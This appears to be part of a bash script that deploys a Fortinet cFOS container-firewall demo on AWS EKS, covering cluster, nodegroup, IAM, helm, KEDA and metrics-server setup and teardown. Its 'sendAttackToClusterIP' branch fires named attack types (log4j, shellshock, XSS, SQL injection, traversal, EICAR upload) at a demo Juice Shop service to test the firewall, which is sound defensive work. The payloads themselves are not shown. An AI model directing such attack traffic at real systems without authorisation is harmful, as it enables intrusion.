    fi 

    echo "✅ CFOS license processing completed successfully."
    return 0
}


deployCFOSandAgentChinaAWS() {
    local region=$1
    local helm_repo_url

    echo remove cached cfos helm chart
    helm repo remove cfos  
    # Set helm repository URL based on region
    if [ "$region" == "china" ]; then
        helm_repo_url="${ALTERNATIVEDOWNLOADURL}"
        echo "Adding CFOS Helm repository for China region..." 
        echo ${helm_repo_url}
    else
        helm_repo_url=${CFOSHELMREPO}
        echo "Adding CFOS Helm repository ${CFOSHELMREPO} for Global region..."
        echo ${helm_repo_url}
    fi
    echo ${helm_repo_url}

    # Check if repo exists and update URL if needed
    if helm repo list | grep -q "^cfos"; then
        echo "Repository 'cfos' exists, removing old configuration..."
        helm repo remove cfos
    fi

    # Add helm repository with retries
    local max_attempts=3
    local attempt=1
    local success=false

    while [ $attempt -le $max_attempts ] && [ "$success" = false ]; do
        echo "Attempt $attempt to add helm repository ${helm_repo_url}..."
        if helm repo add cfos "${helm_repo_url}"; then
            success=true
        else
            echo "Attempt $attempt failed"
            if [ $attempt -lt $max_attempts ]; then
                echo "Retrying in 5 seconds..."
                sleep 5
            fi
            attempt=$((attempt + 1))
        fi
    done

    if [ "$success" = false ]; then
        echo "❌ Error: Failed to add helm repository after $max_attempts attempts"
        return 1
    fi

    echo "Updating CFOS Helm repository only with helm repo update cfos"
    if ! helm repo update cfos; then
        echo "❌ Error: Failed to update cfos repository"
        return 1
    fi

    # Get latest version with explicit repository name
    VERSION=$(helm search repo cfos/cfos --versions | awk 'NR==2 {print $2}')
    if [ -z "$VERSION" ]; then
        echo "❌ Error: Could not determine CFOS version"
        return 1
    fi
    echo "Installing CFOS version: $VERSION"

    # Get DNS service IP
    dnsAddress=$(kubectl get svc kube-dns -n kube-system -o jsonpath='{.spec.clusterIP}')
    if [ -z "$dnsAddress" ]; then
        echo "❌ Error: Could not determine DNS service IP"
        return 1
    fi
    echo "Using DNS address: $dnsAddress"

    # Install/Upgrade CFOS with explicit wait and timeout
    echo "Installing/Upgrading CFOS..."
    if [ "$region" == "china" ]; then
        echo "$region region specific installation with ECR repository"
        if ! helm upgrade --install cfos7210250-deployment-new cfos/cfos \
            --version "$VERSION" \
            --wait \
            --timeout 10m \
            --set routeManager.image.pullPolicy=Always \
            --set dnsConfig.nameserver="$dnsAddress" \
            --set routeManager.env.DEFAULT_FIREWALL_POLICY=${DEMOCFOSFIREWALLPOLICY} \
	    --set kedaScaling.enabled=$enableKeda \
            --set cFOSmetricExample.enabled=true \
            --set persistence.enabled=true \
            --set image.tag=fos-multiarch-v70255 \
            --set initContainers.image.repository=${MYIMAGEREPO}/busybox; then
            
            echo "❌ Failed to install/upgrade CFOS"
            echo "Checking pod status..."
            kubectl get pods
            return 1
        fi
    else
        if ! helm upgrade --install cfos7210250-deployment-new cfos/cfos \
            --version "$VERSION" \
            --wait \
            --timeout 10m \
            --set routeManager.image.pullPolicy=Always \
            --set dnsConfig.nameserver="$dnsAddress" \
            --set routeManager.env.DEFAULT_FIREWALL_POLICY=${DEMOCFOSFIREWALLPOLICY} \
	    --set kedaScaling.enabled=$enableKeda \
            --set image.tag=fos-multiarch-v70255 \
            --set persistence.enabled=true \
            --set cFOSmetricExample.enabled=true; then
            
            echo "❌ Failed to install/upgrade CFOS"
            echo "Checking pod status..."
            kubectl get pods
            return 1
        fi
    fi

    # Verify the installation
    echo "Verifying CFOS installation..."
    if ! helm list | grep -q "cfos7210250-deployment-new"; then
        echo "❌ Error: CFOS installation not found in helm list"
        return 1
    fi

    echo "✅ CFOS deployment completed successfully"
    return 0
}


install_metrics_server_ecr() {
    # Check if metrics-server is already installed  
    if kubectl get deployment metrics-server -n kube-system >/dev/null 2>&1; then
        echo "✅ Metrics-server is already installed"
        return 0
    fi

    echo "Installing metrics-server for China region using ECR..."
    local yaml_file="components.yaml"
    local primary_url="https://github.com/kubernetes-sigs/metrics-server/releases/latest/download"

    # Try primary download URL first
        if ! download_yaml "${primary_url}/${yaml_file}" "${yaml_file}"; then
        echo "Primary download failed, trying alternative China region URL..."
        
        # Try alternative China region URL
        if ! download_yaml "${ALTERNATIVEDOWNLOADURL}/${yaml_file}" "${yaml_file}"; then
            echo "❌ Error: Failed to download metrics-server YAML from both sources"
            exit 1
        fi
        echo "✅ Successfully downloaded metrics-server YAML from alternative source"
    else
        echo "✅ Successfully downloaded metrics-server YAML from primary source"
    fi

    echo "Replacing the image repository with OS-specific sed command"

    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS version
        sed -i '' "s|registry.k8s.io/metrics-server/|${MYIMAGEREPO}/|g" components.yaml
    else
        # Linux version
        sed -i "s|registry.k8s.io/metrics-server/|${MYIMAGEREPO}/|g" components.yaml
    fi

    # Apply the modified yaml
    if ! kubectl apply -f components.yaml; then
        echo "❌ Error: Failed to apply metrics-server configuration"
        exit 1
    fi

    # Wait for metrics-server deployment to be ready
    echo "Waiting for metrics-server to be ready..."
    if ! kubectl -n kube-system wait deployment metrics-server --for condition=Available=True --timeout=300s; then
        echo "❌ Error: Metrics-server deployment failed to become ready"
        exit 1
    fi

    echo "✅ Metrics-server installation completed with ECR images"
}

install_metrics_server() {
    # Check if metrics-server is already installed
    if kubectl get deployment metrics-server -n kube-system >/dev/null 2>&1; then
        echo "✅ Metrics-server is already installed"
        return 0
    fi

    echo "Installing metrics-server for global region..."
    kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml

    # Wait for metrics-server deployment to be ready
    echo "Waiting for metrics-server to be ready..."
    kubectl -n kube-system wait deployment metrics-server --for condition=Available=True --timeout=300s
    
    if [ $? -eq 0 ]; then
        echo "✅ Metrics-server is ready"
    else
        echo "❌ Error: Metrics-server deployment failed to become ready"
        return 1
    fi
}

check_eks_cluster() {
    echo "aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    
    if aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
        return 0 # Cluster exists
    else
        return 1 # Cluster doesn't exist
    fi
}


install_keda_with_helm() {
    # Add KEDA Helm repository
    helm repo add kedacore https://kedacore.github.io/charts

    # Update Helm repositories
    helm repo update

    # Install KEDA in keda namespace
    helm install keda kedacore/keda --namespace keda --create-namespace
}

install_keda_with_yaml_ecr() {
    # Download KEDA yaml
    # Try primary download URL first

    local keda_version="2.12.1"
    local yaml_file="keda-${keda_version}.yaml"
    local primary_url="https://github.com/kedacore/keda/releases/download/v${keda_version}/keda-${keda_version}.yaml"
    


    if ! download_yaml "${primary_url}" "${yaml_file}"; then
        echo "Primary download failed, trying alternative China region URL..."
        
        # Try alternative China region URL
        if ! download_yaml "${ALTERNATIVEDOWNLOADURL}/${yaml_file}" "${yaml_file}"; then 
            echo "❌ Error: Failed to download KEDA YAML from both sources"
            exit 1
        fi
        echo "✅ Successfully downloaded KEDA YAML from alternative source"
    else
        echo "✅ Successfully downloaded KEDA YAML from primary source"
    fi


    # Replace image repository from ghcr.io to ECR

    if [[ "$OSTYPE" == "darwin"* ]]; then
        # macOS version
        sed -i '' "s|ghcr.io/kedacore/|${MYIMAGEREPO}/|g" keda-2.12.1.yaml
    else
        # Linux version
        sed -i "s|ghcr.io/kedacore/|${MYIMAGEREPO}/|g" keda-2.12.1.yaml
    fi

    # Apply the modified yaml
    kubectl apply  --server-side  -f keda-2.12.1.yaml

    # Clean up the downloaded file
    #rm keda-2.12.1.yaml
}

cleanup() {
    rm -f node-trust-policy.json
    rm -f way3cluster.yaml
}




# Function to determine if we're in China region
is_china_region() {
    [[ $AWS_REGION == cn-* ]]
}

function delete_cloudformation_stack() {

    local stack_name="eksctl-${CLUSTERNAME}-cluster"
    echo "aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    if aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
        echo "Stack exists, deleting stack $stack_name..."
        aws cloudformation delete-stack --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE
        echo "Stack exists and deletion initiated"
        return 0 # Stack exists and deletion initiated
    else
        return 1 # Stack doesn't exist
    fi
}

check_cloudformation_stack() {
    local stack_name="eksctl-${CLUSTERNAME}-cluster"
    
    echo "Checking CloudFormation stack status..."
    echo "aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    
    if aws cloudformation describe-stacks --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
#        echo "Stack exists, deleting stack $stack_name..."
#        aws cloudformation delete-stack --stack-name "$stack_name" --region $AWS_REGION --profile $AWS_PROFILE
#        echo "Stack exists and deletion initiated"
        return 0 # Stack exists and deletion initiated
    else
        return 1 # Stack doesn't exist
    fi
}

# Function to wait for stack deletion
wait_for_stack_deletion() {
    local stack_name="eksctl-${CLUSTERNAME}-cluster"
    local max_attempts=60  # 30 minutes (30 seconds * 60)
    local attempt=1

    echo "Waiting for CloudFormation stack deletion..."
    
    while [ $attempt -le $max_attempts ]; do
        if ! check_cloudformation_stack; then
            echo "✅ CloudFormation stack has been deleted successfully"
            return 0
        fi
        
        echo "Still waiting for stack deletion... Attempt $attempt of $max_attempts"
        sleep 30
        attempt=$((attempt + 1))
    done

    echo "❌ Timeout waiting for stack deletion after 30 minutes"
    return 1
}

create_node_role() {
    # Check if role already exists
    echo "aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE 2>/dev/null" 
    if ! aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE 2>/dev/null; then
        # Create trust policy document with dynamic EC2 service
        cat << EOF > node-trust-policy.json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "${EC2_SERVICE}"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

        # Create the IAM role
        aws iam create-role \
            --role-name eksNodeRole \
            --assume-role-policy-document file://node-trust-policy.json \
            --profile $AWS_PROFILE || return 1

        # Attach required policies with dynamic ARN prefix
        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKSWorkerNodePolicy \
            --profile $AWS_PROFILE || return 1

        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKS_CNI_Policy \
            --profile $AWS_PROFILE || return 1

        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly \
            --profile $AWS_PROFILE || return 1

        aws iam attach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonSSMManagedInstanceCore \
            --profile $AWS_PROFILE || return 1

        echo "Waiting for role to be fully created..."
        sleep 10
    else
        echo "Role eksNodeRole already exists"
    fi
} 
create_cluster_only() {
    # Check if CloudFormation stack exists
    trap cleanup EXIT

    if check_cloudformation_stack; then
        echo "Error: CloudFormation stack for cluster $CLUSTERNAME still exists"
        echo "Please wait for complete cleanup before creating a new cluster"
        exit 1
    fi  # This was the issue - missing 'fi'

    create_node_role

    PODCIDR="10.244.0.0/16"
    AVAILABILITY_ZONES=$(aws ec2 describe-availability-zones --region $AWS_REGION --profile $AWS_PROFILE --query "AvailabilityZones[?State=='available'].ZoneName" --output text | tr '\t' ',' | cut -d',' -f1-2)
    filename="way3cluster.yaml"
    cat > $filename << EOF
apiVersion: eksctl.io/v1alpha5
kind: ClusterConfig
availabilityZones: [$(echo $AVAILABILITY_ZONES | tr ',' '\n' | sed 's/^/"/' | sed 's/$/"/' | paste -sd ',' -)]
metadata:
  version: "${EKSVERSION}"
  name: $CLUSTERNAME
  region: $AWS_REGION

privateCluster:
  enabled: ${ISPRIVATE}
  additionalEndpointServices:
    - "cloudformation"
    - "autoscaling"

iam:
  withOIDC: true

vpc:
  autoAllocateIPv6: false
  cidr: ${PODCIDR}
  clusterEndpoints:
    privateAccess: true
    publicAccess: true
  nat:
    gateway: HighlyAvailable

accessConfig:
  bootstrapClusterCreatorAdminPermissions: true
  authenticationMode: API 

kubernetesNetworkConfig:
  ipFamily: IPv4
  serviceIPv4CIDR: ${SERVICEIPV4CIDR}

addons:
  - name: vpc-cni
    version: latest
  - name: kube-proxy
    version: latest
  - name: coredns
    version: latest
  - name: metrics-server
    version: latest
  - name: eks-pod-identity-agent
    version: latest
EOF

    # Check if file was created successfully
    if [ ! -f "$filename" ]; then
        echo "Error: Failed to create cluster configuration file"
        exit 1
    fi

    eksctl create cluster -f $filename --profile $AWS_PROFILE --without-nodegroup
}


function create_eks_worker_node_key_pair () {

# Variables
KEY_NAME="my_key_pair_eks_cfos_demo"
KEY_PATH="$HOME/.ssh/id_rsa.pub"

echo creating keypair with name $KEY_NAME with $KEY_PATH

# Check if the public key exists
if [ ! -f "$KEY_PATH" ]; then
    echo "Public key not found at $KEY_PATH. Creating a new key pair..."
    ssh-keygen -t rsa -b 2048 -f "$HOME/.ssh/id_rsa" -N ""
    echo "Key pair created."
else
    echo "Public key found at $KEY_PATH."
fi

# Check if the key pair already exists in AWS
EXISTING_KEY=$(aws ec2 describe-key-pairs --key-name "$KEY_NAME" --query 'KeyPairs[0].KeyName' --output text 2>/dev/null)

if [ "$EXISTING_KEY" == "$KEY_NAME" ]; then
    echo "Key pair $KEY_NAME already exists in AWS. Deleting it..."
    aws ec2 delete-key-pair --key-name "$KEY_NAME"
    echo "Existing key pair deleted."
fi

# Import the public key into AWS
echo "Importing the public key into AWS..."
aws ec2 import-key-pair --key-name "$KEY_NAME" --public-key-material fileb://"$KEY_PATH"
echo "Key pair imported successfully."

}

create_nodegroups() {
    echo "Creating nodegroups only..."

    AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text --profile $AWS_PROFILE)
    SUBNET_IDS=$(aws ec2 describe-subnets \
        --filters "Name=vpc-id,Values=$(aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE --query 'cluster.resourcesVpcConfig.vpcId' --output text)" \
        --query 'Subnets[*].SubnetId' \
        --output text \
	--region $AWS_REGION \
        --profile $AWS_PROFILE)
    echo $SUBNET_IDS

echo "Creating Key $KEY_NAME for ssh into worker node" 

create_eks_worker_node_key_pair

    # Create nodegroups
    for ng in "ng-app" "ng-security"; do
        echo "Creating nodegroup: $ng"
        if [ "$ng" == "ng-app" ]; then
            labels="role=worker,app=true"
        else
            labels="role=worker,security=true"
        fi

        aws eks create-nodegroup \
            --cluster-name $CLUSTERNAME \
            --nodegroup-name $ng \
            --scaling-config minSize=0,maxSize=3,desiredSize=${DESIREDWORKERNODESIZE} \
            --instance-types t2.large \
            --node-role ${IAM_PREFIX}:iam::${AWS_ACCOUNT_ID}:role/eksNodeRole \
            --subnets ${SUBNET_IDS} \
            --labels $labels \
            --region $AWS_REGION \
            --profile $AWS_PROFILE \
            --remote-access ec2SshKey=$KEY_NAME
    done

    # Wait for nodegroups to be ready
    echo "Waiting for nodegroups to be ready..."
    for ng in "ng-app" "ng-security"; do
        echo "Waiting for nodegroup $ng to be active..."
        while true; do
            STATUS=$(aws eks describe-nodegroup \
                --cluster-name $CLUSTERNAME \
                --nodegroup-name $ng \
                --region $AWS_REGION \
                --profile $AWS_PROFILE \
                --query 'nodegroup.status' \
                --output text)
            
            echo "Nodegroup $ng status: $STATUS"
            
            if [ "$STATUS" == "ACTIVE" ]; then
                echo "Nodegroup $ng is now active"
                break
            elif [ "$STATUS" == "FAILED" ] || [ "$STATUS" == "CREATE_FAILED" ]; then
                echo "❌ Nodegroup $ng creation failed"
                return 1
            fi
            
            echo "Still waiting for nodegroup $ng to be active..."
            sleep 30
        done
    done

    echo "✅ All nodegroups are ready"
}

function create_apply_cfos_configmap_demo1() {
    filename="cfosconfigmapwebprofiledemo1.yaml"
    cat << EOF | tee $filename
apiVersion: v1
data:
  config: |-
    config log syslogd setting
      set status enable
      set server "fazcfos2025.eastus.cloudapp.azure.com"
      set interface "eth0"
    end
    config webfilter profile
    edit "default"
        config ftgd-wf
            set options error-allow
        end
    end
  type: partial
kind: ConfigMap
metadata:
  labels:
    app: fos
    category: config
  name: webprofileerrorpass
EOF
kubectl apply -f $filename || failed to apply configmap $filename
}

delete_cluster() {
    echo "Starting cluster deletion process..."
    
    # Check if cluster exists first
    echo "aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
    if ! aws eks describe-cluster --name $CLUSTERNAME --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
        echo "Cluster $CLUSTERNAME does not exist"
    else
        # Delete nodegroups first
        for ng in "ng-app" "ng-security"; do
        echo "aws eks describe-nodegroup --cluster-name $CLUSTERNAME --nodegroup-name $ng --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1"
            if aws eks describe-nodegroup --cluster-name $CLUSTERNAME --nodegroup-name $ng --region $AWS_REGION --profile $AWS_PROFILE >/dev/null 2>&1; then
                echo "Deleting nodegroup: $ng"
                aws eks delete-nodegroup \
                    --nodegroup-name $ng \
                    --cluster-name $CLUSTERNAME \
                    --region $AWS_REGION \
                    --profile $AWS_PROFILE

                echo "Waiting for nodegroup $ng to be deleted..."
                while true; do
                    if ! aws eks describe-nodegroup \
                        --cluster-name $CLUSTERNAME \
                        --nodegroup-name $ng \
                        --region $AWS_REGION \
                        --profile $AWS_PROFILE >/dev/null 2>&1; then
                        echo "Nodegroup $ng has been deleted"
                        break
                    fi
                    echo "Still waiting for nodegroup $ng to be deleted..."
                    sleep 30
                done
            else
                echo "Nodegroup $ng not found"
            fi
        done

        # Delete the cluster
        echo "Deleting cluster: $CLUSTERNAME"
        eksctl delete cluster \
            --name $CLUSTERNAME \
            --region $AWS_REGION \
            --profile $AWS_PROFILE

        # Wait for CloudFormation stack to be fully deleted
        wait_for_stack_deletion
    fi

    # Delete IAM role and its policies
    echo "aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE >/dev/null 2>&1" 
    if aws iam get-role --role-name eksNodeRole --profile $AWS_PROFILE >/dev/null 2>&1; then
        echo "Deleting IAM role policies..."
        
        # Detach policies
        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKSWorkerNodePolicy \
            --profile $AWS_PROFILE

        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEKS_CNI_Policy \
            --profile $AWS_PROFILE

        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly \
            --profile $AWS_PROFILE

        aws iam detach-role-policy \
            --role-name eksNodeRole \
            --policy-arn ${IAM_PREFIX}:iam::aws:policy/AmazonSSMManagedInstanceCore \
            --profile $AWS_PROFILE 

        echo "Deleting IAM role..."
        aws iam delete-role --role-name eksNodeRole --profile $AWS_PROFILE
    else
        echo "IAM role eksNodeRole not found"
    fi
    
    echo "✅ Cluster and IAM role deletion process completed"
}

# Function to print usage
print_usage() {
    echo "Usage: $0 [command] [region]"
    echo "Example: Deploy with global aws default profile:  $0 demo default or $0 demo"
    echo "Example: Deploy with china aws profile:  $0 demo china"
    echo "Example: Deploy with china aws profile and custom variable:  export DEMOCFOSFIREWALLPOLICY=\"UTM\"; $0 demo china"
    echo "Commands:"
    echo "  demo                                - CreateEverythingIncludeEKSCluster" 
    echo "  createClusterOnly                   - Create EKS cluster without nodegroups"
    echo "  createClusterWithNodeGroup          - Create EKS cluster with nodegroups"
    echo "  createNodeGroupOnly                 - Create nodegroups for existing cluster"
    echo "  deployKeda                          - Deploy KEDA (Helm for global, ECR for China)"
    echo "  delete_all                          - Delete entire cluster and nodegroups"
    echo "  deleteCFOSandAgent                  - Delete CFOS, agent and other related"
    echo "  deployLocalPathProvisioner          - Deploy local-path-provisioner"
    echo "  deploycFOSAndAgent                  - Deploy cFOS and Agent with demo policy"
    echo "  createCFOSLicenseConfigmap 		- Create cFOS configmap license yaml file from cfos license file"
    echo "  deployDemoPod                       - Deploy protected demo application pod and check connectivity"
    echo "  checkPrerequisites                  - Check Whether the program is able to run" 
    echo "  saveconfig                          - Save Default Variable for edit"
    echo "  sendAttackToClusterIP               - Send attack to clusterip type of svc address"
    echo "  installDep                          - install Dependencies -eksctl ."
    echo "Region (optional):"
    echo "  china                      - Use China region settings"
    echo "  global                     - Use Global region settings (default)"
    exit 1
}

# Main execution
if [ $# -lt 1 ]; then
    echo "❌ wrong command"
    print_usage
fi

# Set region based on second argument
if [ "$2" == "china" ]; then
    set_china_aws_variable
else
    set_global_aws_variable
fi

# Execute based on command argument
# Execute based on command argument
case "$1" in
    createCFOSLicenseConfigmap)
       create_license_configmap $2 || exit 1
        ;;
    createClusterOnly)
        create_cluster_only || exit 1
        ;;
    createClusterWithNodeGroup)
        create_cluster_only || exit 1
        create_nodegroups || exit 1
        ;;
    createNodeGroupOnly)
        create_nodegroups || exit 1
        ;;
    deployKeda)
        deploykeda "$2" || exit 1
        ;; 
    deployLocalPathProvisioner)
    #    if [ "$2" == "china" ]; then
    #        set_china_aws_variable
    #    else
    #        set_global_aws_variable
    #    fi

        # Check if cluster exists
        if ! check_eks_cluster; then
            echo "EKS cluster does not exist. Creating cluster with nodegroups first..."
            create_cluster_only || exit 1
            create_nodegroups || exit 1
            echo "Cluster creation completed. Proceeding with local-path-provisioner deployment..."
        fi

        # Deploy local-path-provisioner
        deploy_local_path_provisioner "$2" || exit 1
        ;;
    deploycFOSAndAgent)
       deploy_cfos_and_agent "$2" || exit 1
       applyCFOSLicense || exit 1
        ;;
    delete_all)
        delete_cluster || exit 1
	delete_cloudformation_stack || exit 1
        ;;
    deleteCFOSandAgent)
        check_license_file
        deleteCFOSandAgent || exit 1
        ;;
    deployDemoPod)
        deploy_demo_pod || exit 1
        ;;
    demo)
        check_license_file || exit 1 
        applyCFOSLicense || exit 1 
	if ! eksctl get cluster ${CLUSTERNAME} ; then
        create_cluster_only || return 1
        create_nodegroups || return 1
	fi 
        deploy_cfos_and_agent "$2" || exit 1
        applyCFOSLicense || exit 1 
        deploy_demo_pod  || exit 1
        create_apply_cfos_configmap_demo1 || exit 1
	send_attack_traffic || exit 1 
        ;;
    checkPrerequisites)
        check_prerequisites || exit 1
        ;;
    installDep)
	upgradeLatestEKSCTL || exit 1
        install_latest_aws_cli || exit 1
	;;
    saveconfig)
        saveVariableForEdit "$2"
	;;
    sendAttackToClusterIP)
       create_apply_cfos_configmap_demo1 || exit 1

if [ "$#" -le 2 ]; then
    echo " ❌ usage ./ekscfosdemo.sh sendAttackToClusterIP <your aws profile> <source pod label> <source namespace> <target svc name> <target namespace> <ips type> "
    echo "✅ now use default "

    # Loop through attack types and send attack traffic
    for attack in "normal" "log4j" "shellshock" "xss" "lfi" "rfi" "user_agent_malware" "sql_injection" "directory_traversal"; do
        send_attack_traffic 'app=diag2' 'backend' 'juiceshop-service' 'security' "$attack" "ips.0" || exit 1
    done
    
    # Handle the exception for "eicarupload"
    send_attack_traffic 'app=diag2' 'backend' 'juiceshop-service' 'security' "eicarupload" "virus.0" || exit 1
    
else
    shift 2
    send_attack_traffic "$@" || exit 1
fi

        ;;
    *)
        print_usage
        ;;
esac
